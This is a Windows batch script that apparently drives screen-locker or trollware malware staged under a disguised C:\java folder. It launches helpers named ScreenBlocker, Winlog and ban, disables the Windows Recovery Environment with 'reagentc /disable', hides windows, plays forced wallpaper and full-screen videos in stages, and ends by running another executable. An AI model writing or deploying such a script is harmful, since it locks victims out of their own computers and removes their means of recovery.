%@Try%
start C:\java\protection\start\startvol.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startScreenBlocker.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startcur.exe
%@EndTry%
%@Try%
start C:\java\attention.exe
%@EndTry%
%@Try%
reagentc /disable
start C:\java\protection\start\startWinlog.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startf.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startban.exe
%@EndTry%

IF EXIST C:\java\saves\save1.bat goto A
cd C:\java\Wallpaper\engine
wp id >wpid.txt
for /F %%i in (wpid.txt) do set wpid=%%i
echo wpid: %wpid%
wp run mpv --wid=%wpid% C:\java\Wallpaper\engine\wallpapers\1.mp4 --loop=inf --player-operation-mode=pseudo-gui --force-window=yes
start C:\java\hide.exe
timeout -t 20 -nobreak >nul
start C:\java\hide.exe
timeout -t 20 -nobreak >nul
start C:\java\hide.exe
timeout -t 20 -nobreak >nul
start C:\java\hide.exe
timeout -t 13 -nobreak >nul
taskkill -f -im mpv.exe
taskkill -f -im mpv.com
IF EXIST "C:\java\saves\DELETE TO ENABLE SAVES.bat" goto A
copy C:\java\f\save1.bat C:\java\saves
:A

IF EXIST C:\java\saves\save2.bat goto B
taskkill -f -im mpv.exe
taskkill -f -im mpv.com
start /wait C:\java\video\VideoPlayer.exe C:\java\video\1.mp4
taskkill /F /IM VideoPlayer.exe
IF EXIST "C:\java\saves\DELETE TO ENABLE SAVES.bat" goto B
copy C:\java\f\save2.bat C:\java\saves
:B

IF EXIST C:\java\saves\save3.bat goto C
cd C:\java\Wallpaper\engine
wp id >wpid.txt
for /F %%i in (wpid.txt) do set wpid=%%i
echo wpid: %wpid%
wp run mpv --wid=%wpid% C:\java\Wallpaper\engine\wallpapers\2.mp4 --loop=inf --player-operation-mode=pseudo-gui --force-window=yes
start C:\java\hide.exe
timeout -t 22 -nobreak >nul
taskkill -f -im mpv.exe
taskkill -f -im mpv.com
IF EXIST "C:\java\saves\DELETE TO ENABLE SAVES.bat" goto C
copy C:\java\f\save3.bat C:\java\saves
:C

IF EXIST C:\java\saves\save4.bat goto D
taskkill -f -im mpv.exe
taskkill -f -im mpv.com
start /wait C:\java\video\VideoPlayer.exe C:\java\video\2.mp4
taskkill /F /IM VideoPlayer.exe
IF EXIST "C:\java\saves\DELETE TO ENABLE SAVES.bat" goto D
copy C:\java\f\save4.bat C:\java\saves
:D

IF EXIST C:\java\saves\save5.bat goto E
cd C:\java\Wallpaper\engine
wp id >wpid.txt
for /F %%i in (wpid.txt) do set wpid=%%i
echo wpid: %wpid%
wp run mpv --wid=%wpid% C:\java\Wallpaper\engine\wallpapers\3.mp4 --loop=inf --player-operation-mode=pseudo-gui --force-window=yes
timeout -t 42 -nobreak >nul
taskkill -f -im mpv.exe
taskkill -f -im mpv.com
IF EXIST "C:\java\saves\DELETE TO ENABLE SAVES.bat" goto E
copy C:\java\f\save5.bat C:\java\saves
:E

IF EXIST C:\java\saves\save6.bat goto F
taskkill -f -im mpv.exe
taskkill -f -im mpv.com
start /wait C:\java\video\VideoPlayer.exe C:\java\video\3.mp4
IF EXIST "C:\java\saves\DELETE TO ENABLE SAVES.bat" goto F
copy C:\java\f\save6.bat C:\java\saves
:F
start C:\java\f.exe
pause